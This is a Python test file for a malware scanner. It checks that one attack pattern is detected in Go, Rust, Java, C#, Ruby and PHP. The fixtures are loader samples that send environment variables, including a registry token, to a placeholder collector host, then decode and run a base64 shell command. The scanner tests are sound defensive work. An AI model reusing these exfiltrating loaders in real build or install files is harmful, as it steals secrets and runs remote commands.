"""The same attack, written in every language the tool claims to cover.

A capability model's promise is that a behavioural rule written once applies
everywhere the primitives are defined. That promise is only kept where the
primitives *are* defined, and a language with no pack does not fail loudly --
it reports clean, which is indistinguishable from safe.

`csharp` was in exactly that state: recognised by the language registry,
walked, and matched by nothing. The program below produced two findings in six
languages and none in C#.

Each case is the same program: read the environment, send it somewhere, decode
a command and run it.
"""

from __future__ import annotations

import pytest

from cordon_scanner import Scanner
from cordon_scanner.core.models import Category
from support import assemble

# Assembled so this file does not become the thing it tests for.
HOST = assemble("https://collector", ".invalid/i")
BLOB = assemble("aWQg", "LXU=")

SAMPLES: dict[str, tuple[str, str]] = {
    "go": (
        "main.go",
        'package main\n\nimport (\n\t"bytes"\n\t"encoding/base64"\n\t"net/http"\n'
        '\t"os"\n\t"os/exec"\n)\n\nfunc main() {\n'
        "\tenv := bytes.NewBufferString(os.Environ()[0])\n"
        f'\thttp.Post("{HOST}", "text/plain", env)\n'
        f'\tblob, _ := base64.StdEncoding.DecodeString("{BLOB}")\n'
        '\texec.Command("/bin/sh", "-c", string(blob)).Run()\n}\n',
    ),
    "rust": (
        "build.rs",
        "use std::process::Command;\n\nfn main() {\n"
        '    let token = std::env::var("CARGO_REGISTRY_TOKEN").unwrap_or_default();\n'
        f'    let _ = reqwest::blocking::Client::new().post("{HOST}").body(token).send();\n'
        f'    let raw = base64::decode("{BLOB}").unwrap();\n'
        '    Command::new("sh").arg("-c").arg(String::from_utf8(raw).unwrap()).status();\n}\n',
    ),
    "java": (
        "Setup.java",
        "import java.net.*;\nimport java.util.Base64;\n\npublic class Setup {\n"
        "  public static void main(String[] a) throws Exception {\n"
        "    String env = System.getenv().toString();\n"
        f'    HttpURLConnection c = (HttpURLConnection) new URL("{HOST}").openConnection();\n'
        "    c.setDoOutput(true);\n    c.getOutputStream().write(env.getBytes());\n"
        f'    byte[] p = Base64.getDecoder().decode("{BLOB}");\n'
        "    Runtime.getRuntime().exec(new String(p));\n  }\n}\n",
    ),
    "csharp": (
        "Setup.cs",
        "using System;\nusing System.Diagnostics;\nusing System.Net.Http;\n\nclass Setup {\n"
        "  static void Main() {\n"
        "    var env = Environment.GetEnvironmentVariables().ToString();\n"
        f'    new HttpClient().PostAsync("{HOST}", new StringContent(env));\n'
        f'    var b = Convert.FromBase64String("{BLOB}");\n'
        '    Process.Start("/bin/sh", System.Text.Encoding.UTF8.GetString(b));\n  }\n}\n',
    ),
    "ruby": (
        "extconf.rb",
        "require 'net/http'\nrequire 'base64'\n\n"
        "env = ENV.to_h.to_s\n"
        f"Net::HTTP.post(URI('{HOST}'), env)\n"
        f"system(Base64.decode64('{BLOB}'))\n",
    ),
    "php": (
        "install.php",
        "<?php\n$env = print_r(getenv(), true);\n"
        f"file_get_contents('{HOST}?d=' . urlencode($env));\n"
        f"shell_exec(base64_decode('{BLOB}'));\n",
    ),
}


def flagged(root) -> set[str]:
    return {
        f.rule_id
        for f in Scanner().scan(root).findings
        if f.category in (Category.MALICIOUS, Category.SUSPICIOUS)
    }


@pytest.mark.parametrize("language", sorted(SAMPLES))
def test_the_same_attack_is_caught_in_every_language(tmp_path, language: str) -> None:
    filename, body = SAMPLES[language]
    (tmp_path / filename).write_text(body, encoding="utf-8")
    found = flagged(tmp_path)
    assert found, (
        f"the {language} sample reads the environment, sends it away, decodes a "
        f"command and runs it, and produced nothing. A language with no "
        f"capability pack reports clean, which is indistinguishable from safe."
    )


@pytest.mark.parametrize("language", sorted(SAMPLES))
def test_the_decode_and_execute_pair_is_seen(tmp_path, language: str) -> None:
    """The pair that makes it a second-stage loader, in every language."""
    filename, body = SAMPLES[language]
    (tmp_path / filename).write_text(body, encoding="utf-8")
    found = flagged(tmp_path)
    assert any("DECODE_EXEC" in r or "DROPPER" in r or "EXFIL" in r for r in found), found


class TestEveryRecognisedLanguageHasPrimitives:
    """A language the registry names but no pack covers is a silent hole."""

    def test_no_recognised_language_is_left_without_rules(self) -> None:
        from collections import defaultdict

        from cordon_scanner.rules.loader import RuleLoader

        covered: defaultdict[str, set[str]] = defaultdict(set)
        for pack in RuleLoader.load_builtin():
            for compiled in pack:
                if compiled.rule.capability is None:
                    continue
                for language in compiled.rule.languages:
                    covered[language].add(compiled.rule.capability.value)

        # The languages this project claims in its coverage matrix.
        claimed = {
            "python",
            "javascript",
            "typescript",
            "shell",
            "powershell",
            "go",
            "rust",
            "java",
            "kotlin",
            "scala",
            "csharp",
            "php",
            "ruby",
            "groovy",
            "cmake",
            "makefile",
            "xml",
        }
        missing = sorted(language for language in claimed if not covered.get(language))
        assert not missing, f"claimed languages with no capability rules: {missing}"
